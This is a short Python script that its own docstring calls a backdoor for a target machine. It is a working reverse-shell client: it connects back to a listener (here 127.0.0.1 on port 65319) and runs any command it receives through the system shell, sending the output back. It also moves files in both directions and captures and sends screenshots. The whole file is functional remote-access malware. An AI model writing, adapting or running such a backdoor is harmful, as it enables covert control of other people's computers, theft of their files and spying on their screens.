# -*- Coding : utf-8 -*-

"""
    Backdoor to execute on target machine.
    Connect to the server running on attacker machine.
"""

import socket, subprocess, os
import pyautogui

def download_file(filename):
    with open(filename, "wb") as file:
        chunk = s.recv(1024)
        while chunk:
            file.write(chunk)
            try:
                chunk = s.recv(1024)
            except socket.timeout:
                break

def upload_file(filename):
    with open(filename, "rb") as file:
        s.send(file.read())

def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode()
            return data
        except ValueError:
            continue

def shell():
    while True:
        command = reliable_recv()
        if command == "quit":
            break
        elif command == "help":
            pass
        elif command == "clear":
            pass

        elif command[:2] == "cd":
            os.chdir(command[3:])

        elif command[:6] == "upload":
            download_file(command[7:])

        elif command[:8] == "download":
            upload_file(command[9:])

        elif command[:10] == "screenshot":
            screenshot()
            upload_file("screenshot.png")
            os.remove("screenshot.png")

        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                       stderr=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            s.send(result) # result contain bytes, so no need to encode it

    s.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 65319))
shell()


